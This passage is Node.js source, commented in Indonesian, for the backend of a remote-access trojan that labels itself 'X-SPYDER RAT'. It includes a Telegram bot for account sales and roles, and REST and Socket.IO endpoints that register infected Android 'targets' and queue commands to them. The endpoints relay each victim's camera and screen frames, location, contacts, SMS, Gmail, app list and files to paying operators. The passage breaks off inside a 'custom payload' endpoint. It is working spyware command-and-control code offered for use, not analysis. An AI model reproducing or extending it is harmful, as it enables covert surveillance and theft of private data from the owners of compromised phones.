      const userPath = path.join(SESSION_PATH, userFolder);
      if (!fs.lstatSync(userPath).isDirectory()) continue;
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) { fs.rmSync(userPath, { recursive: true, force: true }); deletedCount++; }
    }
    const responseMsg = deletedCount > 0 
      ? `Folder sampah berhasil dihapus: ${deletedCount}`
      : `Tidak ada folder sampah. Server bersih.`;
    bot.sendMessage(chatId, responseMsg);
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "Terjadi kesalahan saat membersihkan folder.");
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isDeveloper = config.ownerList.includes(id) || id === OWNER_ID;
  if (!isDeveloper) return bot.sendMessage(chatId, "Akses ditolak. Root access diperlukan.");
  bot.sendMessage(chatId, "Server sedang restart...");
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");
  setTimeout(() => process.exit(0), 2000);
});

setTimeout(() => {
  const targetChatId = "-1004357112219"; 
  bot.sendMessage(targetChatId, "Server aktif dan berjalan normal.");
}, 3000);

bot.onText(/^\/adddev (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  if (senderId !== OWNER_ID) {
    return bot.sendMessage(chatId, "⛔ Akses ditolak. Hanya owner utama yang bisa menambahkan developer.");
  }
  
  const targetInput = match[1].trim();
  let targetId = parseInt(targetInput);
  
  if (isNaN(targetId)) {
    return bot.sendMessage(
      chatId, 
      "❌ ID tidak valid.\n\n" +
      "Cara mendapatkan ID:\n" +
      "1. Minta user mengirim /id ke bot\n" +
      "2. Atau cek ID dari pesan yang diterima\n\n" +
      "Format: /adddev 123456789"
    );
  }
  
  try {
    const config = loadTelegramConfig();
    
    if (config.ownerList.includes(targetId)) {
      return bot.sendMessage(chatId, `ℹ️ User dengan ID ${targetId} sudah menjadi developer.`);
    }
    
    if (!config.userList.includes(targetId)) {
      config.userList.push(targetId);
    }
    
    config.ownerList.push(targetId);
    
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    
    try {
      await bot.sendMessage(
        targetId,
        `🎉 Selamat! Anda telah diangkat sebagai **Developer** oleh owner.\n\n` +
        `Sekarang Anda memiliki akses penuh ke semua perintah dan menu bot.\n` +
        `Gunakan /start atau /menu untuk melihat daftar perintah.`,
        { parse_mode: 'Markdown' }
      );
    } catch (err) {
      console.log(`[ADDDEV] Gagal mengirim notifikasi ke ${targetId}: ${err.message}`);
    }
    
    bot.sendMessage(
      chatId,
      `✅ **Developer berhasil ditambahkan!**\n\n` +
      `📌 **User ID:** ${targetId}\n` +
      `🔑 **Akses:** Full (Owner Level)\n\n` +
      `User telah mendapatkan akses penuh ke semua fitur bot.`,
      { parse_mode: 'Markdown' }
    );
    
    console.log(`[ADDDEV] User ${targetId} ditambahkan sebagai developer oleh ${senderId}`);
    
  } catch (err) {
    console.error('[ADDDEV] Error:', err);
    bot.sendMessage(chatId, `❌ Gagal menambahkan developer: ${err.message}`);
  }
});

bot.onText(/^\/removedev (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  if (senderId !== OWNER_ID) {
    return bot.sendMessage(chatId, "⛔ Akses ditolak. Hanya owner utama yang bisa menghapus developer.");
  }
  
  const targetInput = match[1].trim();
  let targetId = parseInt(targetInput);
  
  if (isNaN(targetId)) {
    return bot.sendMessage(chatId, "❌ ID tidak valid. Masukkan ID numerik user yang akan dihapus.");
  }
  
  try {
    const config = loadTelegramConfig();
    
    if (!config.ownerList.includes(targetId)) {
      return bot.sendMessage(chatId, `ℹ️ User dengan ID ${targetId} bukan developer.`);
    }
    
    if (targetId === OWNER_ID) {
      return bot.sendMessage(chatId, "❌ Tidak dapat menghapus owner utama.");
    }
    
    config.ownerList = config.ownerList.filter(id => id !== targetId);
    
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    
    try {
      await bot.sendMessage(
        targetId,
        `⚠️ Hak akses Developer Anda telah **dicabut** oleh owner.\n\n` +
        `Anda masih dapat menggunakan bot dengan akses terbatas.`,
        { parse_mode: 'Markdown' }
      );
    } catch (err) {
      console.log(`[REMOVEDEV] Gagal mengirim notifikasi ke ${targetId}: ${err.message}`);
    }
    
    bot.sendMessage(
      chatId,
      `✅ **Developer berhasil dihapus!**\n\n` +
      `📌 **User ID:** ${targetId}\n` +
      `🔑 **Akses sebelumnya:** Full (Owner Level)`,
      { parse_mode: 'Markdown' }
    );
    
    console.log(`[REMOVEDEV] User ${targetId} dihapus dari developer oleh ${senderId}`);
    
  } catch (err) {
    console.error('[REMOVEDEV] Error:', err);
    bot.sendMessage(chatId, `❌ Gagal menghapus developer: ${err.message}`);
  }
});

bot.onText(/^\/listdev$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  const config = loadTelegramConfig();
  const isAuthorized = config.ownerList.includes(senderId) || senderId === OWNER_ID;
  
  if (!isAuthorized) {
    return bot.sendMessage(chatId, "⛔ Akses ditolak. Hanya developer yang bisa melihat daftar developer.");
  }
  
  if (config.ownerList.length === 0) {
    return bot.sendMessage(chatId, "📋 Belum ada developer yang terdaftar.");
  }
  
  let message = "👥 **Daftar Developer:**\n\n";
  
  for (const id of config.ownerList) {
    const isOwner = id === OWNER_ID;
    let displayName = String(id);
    
    try {
      const chat = await bot.getChat(id);
      displayName = chat.username ? `@${chat.username}` : chat.first_name || String(id);
    } catch (err) {}
    
    message += `• **${displayName}** (${id})${isOwner ? ' ⭐ [OWNER UTAMA]' : ''}\n`;
  }
  
  message += `\n📌 Total: ${config.ownerList.length} developer`;
  
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

bot.onText(/^\/id$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username || 'Tidak ada username';
  const firstName = msg.from.first_name || 'Tidak ada nama';
  
  const config = loadTelegramConfig();
  const isDev = config.ownerList.includes(userId) || userId === OWNER_ID;
  
  bot.sendMessage(
    chatId,
    `📌 **Informasi User:**\n\n` +
    `🆔 **ID:** ${userId}\n` +
    `👤 **Username:** @${username}\n` +
    `📛 **Nama:** ${firstName}\n` +
    `🔑 **Status:** ${isDev ? '⭐ Developer' : '👤 User'}\n\n` +
    `💡 Gunakan ID ini untuk perintah /adddev <ID>`,
    { parse_mode: 'Markdown' }
  );
});

function scheduleAutoClean() {
  const now = new Date();
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }
  const delay = nextMidnight - now;
  setTimeout(() => {
    hapusIsiUserLogs();
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

app.use(cors()); 
app.use(bodyParser.json({ limit: '500mb' }));

// ============================================================
// 🔥 RAT ENDPOINTS
// ============================================================

const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
const DEVICES_FILE = path.join(__dirname, 'devices.json');
const DEVICE_LOCK_FILE = path.join(__dirname, 'device_lock.json');
const ACTIVITY_FILE = path.join(__dirname, 'activity_logs.json');
const TARGETS_FILE = './targets.json';
const NOTIF_FILE = './notifications.json';
const COMMANDS_FILE = './commands.json';
const RESPONSES_FILE = './responses.json';

const ROLE_HIERARCHY_RAT = ['founder', 'high admin', 'developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'];
const CAN_CREATE_ROLES_RAT = {
  founder: ['founder', 'high admin', 'developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  'high admin': ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  developers: ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  ceo: ['owner', 'admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  owner: ['admin', 'tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  admin: ['tangan_kanan', 'vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  tangan_kanan: ['vip', 'reseller', 'full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  vip: [],
  reseller: ['full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'],
  full_up: [],
  member_perbulan: [],
  member_perminggu: [],
  member_perhari: []
};

function loadJSON(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return {}; }
}
function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}

function genToken() { return crypto.randomBytes(24).toString('hex'); }
function roleIndexRAT(role) { return ROLE_HIERARCHY_RAT.indexOf(role); }

function getAccountRole(username) {
  const accounts = loadJSON(ACCOUNTS_FILE);
  return accounts[username]?.role || 'member_perhari';
}

function getTrialExpiry(duration) {
  if (!duration || duration === 'permanent') return null;
  const now = new Date();
  if (duration === '3m') now.setMinutes(now.getMinutes() + 3);
  if (duration === '5m') now.setMinutes(now.getMinutes() + 5);
  if (duration === '10m') now.setMinutes(now.getMinutes() + 10);
  if (duration === '3d') now.setDate(now.getDate() + 3);
  if (duration === '7d') now.setDate(now.getDate() + 7);
  if (duration === '30d') now.setDate(now.getDate() + 30);
  return now.toISOString();
}

const savedDevices = loadJSON(DEVICES_FILE);
devices = savedDevices;

app.post('/api/login', (req, res) => {
  const { username, password, androidId } = req.body;
  const accounts = loadJSON(ACCOUNTS_FILE);
  const acc = accounts[username];
  if (!acc || acc.password !== password) return res.status(401).json({ error: 'Invalid credentials' });

  if (!acc.uid) {
    acc.uid = crypto.randomBytes(16).toString('hex');
    accounts[username] = acc;
    saveJSON(ACCOUNTS_FILE, accounts);
  }

  const lockDevices = loadJSON(DEVICE_LOCK_FILE);
  if (lockDevices[username] && lockDevices[username] !== androidId) {
    return res.status(403).json({ error: 'Account already used on another device' });
  }
  lockDevices[username] = androidId;
  saveJSON(DEVICE_LOCK_FILE, lockDevices);

  const token = genToken();
  sessions[token] = { username, uid: acc.uid };
  res.json({
    ok: true,
    token,
    username,
    role: acc.role || 'member_perhari',
    uid: acc.uid,
    expiredDate: acc.trialExpiry || 'permanent',
    news: acc.news || []
  });
});

app.post('/api/logout', (req, res) => {
  const token = req.headers['x-auth-token'];
  if (token) delete sessions[token];
  res.json({ ok: true });
});

app.get('/api/me', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const username = sessions[token].username;
  const accounts = loadJSON(ACCOUNTS_FILE);
  const acc = accounts[username];
  if (!acc) return res.status(404).json({ error: 'Account not found' });
  res.json({
    username: username,
    role: acc.role || 'member_perhari',
    uid: acc.uid,
    trialExpiry: acc.trialExpiry || null
  });
});

app.get('/api/user/getActivityLogs', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const username = sessions[token].username;
  const logs = loadJSON(ACTIVITY_FILE);
  const userLogs = logs[username] || [];
  res.json({ valid: true, logs: userLogs });
});

app.get('/api/user/listUsers', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const myRole = getAccountRole(sessions[token].username);
  const accounts = loadJSON(ACCOUNTS_FILE);
  const myIdx = roleIndexRAT(myRole);

  const users = Object.entries(accounts)
    .filter(([uname, acc]) => {
      const accRole = acc.role || 'member_perhari';
      return myRole === 'founder' || myRole === 'high admin' || roleIndexRAT(accRole) >= myIdx || uname === sessions[token].username;
    })
    .map(([username, acc]) => ({
      username,
      role: acc.role || 'member_perhari',
      uid: acc.uid,
      parent: acc.createdBy || 'SYSTEM'
    }));

  res.json({ valid: true, authorized: true, users });
});

app.get('/api/user/userAdd', async (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const myRole = getAccountRole(sessions[token].username);
  const { username, password, day, role } = req.query;

  if (!username || !password || !day || !role) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  if (!isValidRole(role)) {
    return res.status(400).json({ error: `Role '${role}' tidak valid` });
  }

  const allowed = CAN_CREATE_ROLES_RAT[myRole] || [];
  if (!allowed.includes(role)) {
    return res.status(403).json({ error: `Cannot create ${role} with your role` });
  }

  const accounts = loadJSON(ACCOUNTS_FILE);
  if (accounts[username]) return res.status(409).json({ error: 'Username exists' });

  const newUid = crypto.randomBytes(16).toString('hex');
  const trialExpiry = day === 'permanent' ? null : getTrialExpiry(day + 'd');

  accounts[username] = {
    password,
    displayName: username,
    role,
    uid: newUid,
    createdBy: sessions[token].username,
    createdAt: new Date().toISOString(),
    trialDuration: day === 'permanent' ? 'permanent' : `${day}d`,
    trialExpiry
  };
  saveJSON(ACCOUNTS_FILE, accounts);

  const logs = loadJSON(ACTIVITY_FILE);
  if (!logs[sessions[token].username]) logs[sessions[token].username] = [];
  logs[sessions[token].username].push({
    activity: `Created account ${username} (${role})`,
    timestamp: new Date().toISOString()
  });
  saveJSON(ACTIVITY_FILE, logs);

  bot.sendMessage(OWNER_ID, `✅ Akun baru: ${username} (${role}) oleh ${sessions[token].username}`);

  res.json({ created: true, user: { username, role, uid: newUid } });
});

app.delete('/api/user/deleteUser', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const myRole = getAccountRole(sessions[token].username);
  const target = req.query.username;
  if (!target) return res.status(400).json({ error: 'Username required' });

  const accounts = loadJSON(ACCOUNTS_FILE);
  if (!accounts[target]) return res.status(404).json({ error: 'User not found' });

  const targetRole = accounts[target].role || 'member_perhari';
  if (roleIndexRAT(myRole) >= roleIndexRAT(targetRole)) {
    return res.status(403).json({ error: 'Insufficient role' });
  }

  delete accounts[target];
  saveJSON(ACCOUNTS_FILE, accounts);

  const lockDevices = loadJSON(DEVICE_LOCK_FILE);
  delete lockDevices[target];
  saveJSON(DEVICE_LOCK_FILE, lockDevices);

  for (const [tok, sess] of Object.entries(sessions)) {
    if (sess.username === target) delete sessions[tok];
  }

  bot.sendMessage(OWNER_ID, `🗑️ Akun ${target} dihapus oleh ${sessions[token].username}`);
  res.json({ deleted: true, user: { username: target } });
});

app.get('/api/list-targets', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const uid = sessions[token].uid;

  const list = Object.entries(devices)
    .filter(([id, d]) => d.uid === uid)
    .map(([id, d]) => ({
      id: d.id,
      model: d.model || d.name || 'Unknown',
      name: d.name || d.model || 'Unknown',
      ip: d.ip || '0.0.0.0',
      battery: d.battery || 0,
      status: d.status || 'Offline',
      lastSeen: d.lastSeen || new Date().toISOString(),
      release: d.androidVersion || 'Unknown'
    }));
  res.json(list);
});

app.post('/api/command/:deviceId', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const { deviceId } = req.params;
  const { command, value } = req.body;
  
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === sessions[token].uid);
  if (!target) {
    return res.status(403).json({ error: 'Device not found or unauthorized' });
  }

  if (command === 'camera' || command === 'liveCamera') {
    delete cameraFrames[deviceId];
    let attempts = 0;
    const maxAttempts = 10;
    const checkInterval = setInterval(() => {
      attempts++;
      const frame = cameraFrames[deviceId];
      if (frame) {
        clearInterval(checkInterval);
        res.json({ ok: true, command, deviceId, frame });
      } else if (attempts >= maxAttempts) {
        clearInterval(checkInterval);
        res.status(408).json({ error: 'Timeout waiting for camera frame' });
      }
    }, 500);
    return;
  }

  res.json({ ok: true, command, deviceId });
});

app.get('/api/get-response/:deviceId', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const { deviceId } = req.params;
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === sessions[token].uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const data = target[1].lastResponse || {};
  res.json({ data });
});

app.get('/api/screenshot/:deviceId', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const { deviceId } = req.params;
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === sessions[token].uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const frame = cameraFrames[deviceId];
  if (!frame) {
    res.status(404).json({ error: 'No frame available' });
    return;
  }

  res.json({ ok: true, frame });
});

app.get('/api/live-camera/:deviceId', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const { deviceId } = req.params;
  const { facing } = req.query;
  
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === sessions[token].uid);
  if (!target) {
    return res.status(403).json({ error: 'Device not found or unauthorized' });
  }

  setTimeout(() => {
    const frame = cameraFrames[deviceId];
    if (frame) {
      res.json({ ok: true, frame });
    } else {
      res.status(404).json({ error: 'No frame received within timeout' });
    }
  }, 2000);
});

app.get('/api/gallery/:deviceId', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  const { deviceId } = req.params;
  
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === sessions[token].uid);
  if (!target) {
    return res.status(403).json({ error: 'Device not found or unauthorized' });
  }

  res.json({ photos: [] });
});

app.get('/rat/pairid', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.key;
  if (!token || !sessions[token]) {
    return res.status(401).json({ valid: false, message: 'Invalid session' });
  }
  
  const username = sessions[token].username;
  const accounts = loadJSON(ACCOUNTS_FILE);
  const acc = accounts[username];
  
  if (!acc) {
    return res.status(404).json({ valid: false, message: 'User not found' });
  }
  
  const pairId = `${username}_${acc.uid.substring(0, 8)}`;
  
  res.json({ 
    valid: true, 
    pairId: pairId,
    uid: acc.uid 
  });
});

app.get('/rat/my-devices', (req, res) => {
  const token = req.headers['x-auth-token'] || req.query.key;
  if (!token || !sessions[token]) {
    return res.status(401).json({ valid: false, message: 'Invalid session' });
  }
  
  const uid = sessions[token].uid;
  
  const devicesList = Object.entries(devices)
    .filter(([id, d]) => d.uid === uid)
    .map(([id, d]) => ({
      id: d.id,
      name: d.name || d.model || 'Unknown',
      model: d.model || 'Unknown',
      status: d.status || 'Offline',
      battery: d.battery || 0,
      lastSeen: d.lastSeen || new Date().toISOString(),
      androidVersion: d.androidVersion || 'Unknown'
    }));
  
  res.json({ valid: true, devices: devicesList });
});

app.post('/api/heartbeat/:id', (req, res) => {
  const deviceId = req.params.id;
  let targets = loadJSON(TARGETS_FILE);
  const index = targets.findIndex(t => t.id === deviceId);
  if (index !== -1) {
    targets[index].lastSeen = new Date();
    targets[index].status = "Online";
    saveJSON(TARGETS_FILE, targets);
  }
  res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
  const deviceData = req.body;
  let targets = loadJSON(TARGETS_FILE);
  const index = targets.findIndex(t => t.id === deviceData.id);
  if (index !== -1) {
    targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
  } else {
    targets.push({ ...deviceData, lastSeen: new Date() });
  }
  saveJSON(TARGETS_FILE, targets);
  res.json({ status: 'ok' });
});

app.post('/api/post-notification/:id', (req, res) => {
  const targetId = req.params.id;
  let allNotifs = loadJSON(NOTIF_FILE);
  allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
  if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
  saveJSON(NOTIF_FILE, allNotifs);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const allNotifs = loadJSON(NOTIF_FILE);
  const filtered = allNotifs.filter(n => n.targetId === req.params.id);
  res.json(filtered);
});

app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  let commands = loadJSON(COMMANDS_FILE);
  commands = commands.filter(c => c.targetId !== id);
  commands.push({ targetId: id, command, extra, timestamp: new Date() });
  saveJSON(COMMANDS_FILE, commands);
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  const targetId = req.params.id;
  let commands = loadJSON(COMMANDS_FILE);
  const cmdIndex = commands.findIndex(c => c.targetId === targetId);
  if (cmdIndex !== -1) {
    const cmd = commands[cmdIndex];
    commands.splice(cmdIndex, 1);
    saveJSON(COMMANDS_FILE, commands);
    return res.json(cmd);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const targetId = req.params.id;
  const { cmd, data } = req.body;
  let responses = loadJSON(RESPONSES_FILE);
  const index = responses.findIndex(r => r.targetId === targetId);
  const newRes = { targetId, cmd, data, timestamp: new Date() };
  if (index !== -1) responses[index] = newRes;
  else responses.push(newRes);
  saveJSON(RESPONSES_FILE, responses);
  res.json({ status: 'received' });
});

app.get('/api/get-response/:id', (req, res) => {
  const responses = loadJSON(RESPONSES_FILE);
  const resData = responses.find(r => r.targetId === req.params.id);
  res.json(resData || {});
});

// ============================================================
// 🔥 SOCKET.IO (RAT)
// ============================================================

const io = require('socket.io')(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 10e6
});

io.on('connection', (socket) => {
  socket.on('controller:join', (data) => {
    const token = data?.token;
    if (!token || !sessions[token]) {
      socket.emit('auth:error', { message: 'Unauthorized' });
      return socket.disconnect();
    }
    const username = sessions[token].username;
    const uid = sessions[token].uid;
    socket.data.uid = uid;

    const devList = Object.entries(devices)
      .filter(([id, d]) => d.uid === uid)
      .map(([id, d]) => ({
        id: d.id,
        name: d.name,
        status: d.status || 'Offline',
        lastSeen: d.lastSeen || new Date().toISOString(),
        battery: d.battery || 0
      }));
    socket.emit('devices:update', devList);
  });

  socket.on('device:register', (data) => {
    const { deviceId, name, battery, uid, sdkVersion, androidVersion, charging } = data;
    const finalName = name || deviceId || 'Unknown Device';
    const finalModel = name || deviceId || 'Unknown Model';

    devices[deviceId] = {
      uid,
      id: deviceId,
      name: finalName,
      model: finalModel,
      socketId: socket.id,
      lastSeen: new Date().toISOString(),
      battery: battery || 0,
      status: 'Online',
      charging: charging || false,
      androidVersion: androidVersion || 'Unknown',
      sdkVersion: sdkVersion || 0,
      info: data
    };

    saveJSON(DEVICES_FILE, devices);
    socket.join(`device:${deviceId}`);
    console.log(`[DEVICE] Registered: ${finalName} (${deviceId})`);
    
    io.sockets.sockets.forEach((s) => {
      if (s.data.uid === uid) {
        const devList = Object.entries(devices)
          .filter(([id, d]) => d.uid === uid)
          .map(([id, d]) => ({
            id: d.id,
            name: d.name,
            status: d.status || 'Offline',
            lastSeen: d.lastSeen || new Date().toISOString(),
            battery: d.battery || 0
          }));
        s.emit('devices:update', devList);
      }
    });
  });

  socket.on('device:status', (data) => {
    const { deviceId, status } = data;
    if (devices[deviceId]) {
      devices[deviceId].status = status;
      devices[deviceId].lastSeen = new Date().toISOString();
      saveJSON(DEVICES_FILE, devices);
      
      const uid = devices[deviceId].uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          const devList = Object.entries(devices)
            .filter(([id, d]) => d.uid === uid)
            .map(([id, d]) => ({
              id: d.id,
              name: d.name,
              status: d.status || 'Offline',
              lastSeen: d.lastSeen || new Date().toISOString(),
              battery: d.battery || 0
            }));
          s.emit('devices:update', devList);
        }
      });
    }
  });

  socket.on('camera:frame', (data) => {
    const { deviceId, frame } = data;
    cameraFrames[deviceId] = frame;
    
    if (devices[deviceId]) {
      const uid = devices[deviceId].uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('camera:frame', { deviceId, frame });
        }
      });
    }
  });

  socket.on('screen:frame', (data) => {
    const { deviceId, frame } = data;
    if (devices[deviceId]) {
      const uid = devices[deviceId].uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('screen:frame', { deviceId, frame });
        }
      });
    }
  });

  socket.on('device:notif', (data) => {
    const dev = devices[data.deviceId];
    if (dev) {
      const uid = dev.uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('device:notif', data);
        }
      });
    }
  });

  socket.on('device:location', (data) => {
    const dev = devices[data.deviceId];
    if (dev) {
      const uid = dev.uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('device:location', data);
        }
      });
    }
  });

  socket.on('device:contacts', (data) => {
    const dev = devices[data.deviceId];
    if (dev) {
      const uid = dev.uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('device:contacts', data);
        }
      });
    }
  });

  socket.on('device:sms', (data) => {
    const dev = devices[data.deviceId];
    if (dev) {
      const uid = dev.uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('device:sms', data);
        }
      });
    }
  });

  socket.on('device:apps', (data) => {
    const dev = devices[data.deviceId];
    if (dev) {
      const uid = dev.uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('device:apps', data);
        }
      });
    }
  });

  socket.on('device:gmail', (data) => {
    const dev = devices[data.deviceId];
    if (dev) {
      const uid = dev.uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('device:gmail', data);
        }
      });
    }
  });

  socket.on('device:files', (data) => {
    const dev = devices[data.deviceId];
    if (dev) {
      const uid = dev.uid;
      io.sockets.sockets.forEach((s) => {
        if (s.data.uid === uid) {
          s.emit('device:files', data);
        }
      });
    }
  });

  socket.on('disconnect', () => {
    for (const id in devices) {
      if (devices[id].socketId === socket.id) {
        devices[id].status = 'Offline';
        devices[id].lastSeen = new Date().toISOString();
        saveJSON(DEVICES_FILE, devices);
        
        const uid = devices[id].uid;
        io.sockets.sockets.forEach((s) => {
          if (s.data.uid === uid) {
            const devList = Object.entries(devices)
              .filter(([id, d]) => d.uid === uid)
              .map(([id, d]) => ({
                id: d.id,
                name: d.name,
                status: d.status || 'Offline',
                lastSeen: d.lastSeen || new Date().toISOString(),
                battery: d.battery || 0
              }));
            s.emit('devices:update', devList);
          }
        });
        console.log(`[DEVICE] Disconnected: ${devices[id].name} (${id})`);
        break;
      }
    }
  });
});

bot.onText(/^\/start/, (msg) => {
  if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, '⛔ Access denied.');
  bot.sendMessage(msg.chat.id, `*X-SPYDER RAT BACKEND*\n\nPerintah:\n• /cakun user, pass\n• /listakun\n• /delakun user\n• /addquota user role jumlah\n• /cekquota user`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cakun (.+)/, async (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  const parts = match[1].split(',').map(s => s.trim());
  if (parts.length !== 2) return bot.sendMessage(msg.chat.id, 'Format: /cakun username, password');

  const [username, password] = parts;
  const accounts = loadJSON(ACCOUNTS_FILE);
  if (accounts[username]) return bot.sendMessage(msg.chat.id, '❌ Username already exists');

  accounts[username] = {
    password,
    displayName: username,
    role: 'member_perhari',
    uid: crypto.randomBytes(16).toString('hex'),
    createdAt: new Date().toISOString(),
    trialDuration: 'permanent',
    trialExpiry: null
  };
  saveJSON(ACCOUNTS_FILE, accounts);
  bot.sendMessage(msg.chat.id, `✅ Akun ${username} berhasil dibuat.`);
});

bot.onText(/^\/listakun/, (msg) => {
  if (msg.from.id !== OWNER_ID) return;
  const accounts = loadJSON(ACCOUNTS_FILE);
  const list = Object.entries(accounts).map(([u, a]) => `${u} (${a.role || 'member_perhari'})`).join('\n');
  bot.sendMessage(msg.chat.id, `👥 Daftar akun:\n${list || 'Kosong'}`);
});

bot.onText(/^\/delakun (.+)/, (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  const username = match[1].trim();
  const accounts = loadJSON(ACCOUNTS_FILE);
  if (!accounts[username]) return bot.sendMessage(msg.chat.id, '❌ Akun tidak ditemukan');
  delete accounts[username];
  saveJSON(ACCOUNTS_FILE, accounts);
  bot.sendMessage(msg.chat.id, `🗑️ Akun ${username} dihapus.`);
});

// ============================================================
// 🔥 CUSTOM PAYLOAD
// ============================================================

const PAYLOAD_HISTORY_FILE = path.join(__dirname, 'payload_history.json');

if (!fs.existsSync(PAYLOAD_HISTORY_FILE)) {
  fs.writeFileSync(PAYLOAD_HISTORY_FILE, JSON.stringify({ history: [] }, null, 2));
}

function readPayloadHistory() {
  try {
    const data = fs.readFileSync(PAYLOAD_HISTORY_FILE, 'utf8');
    return JSON.parse(data);
  } catch {
    return { history: [] };
  }
}

function savePayloadHistory(data) {
  fs.writeFileSync(PAYLOAD_HISTORY_FILE, JSON.stringify(data, null, 2));
}

app.post("/api/custom-payload", (req, res) => {
  try {
    const { key, payload, target, delay, loop } = req.body;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, message: "Invalid session key" });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
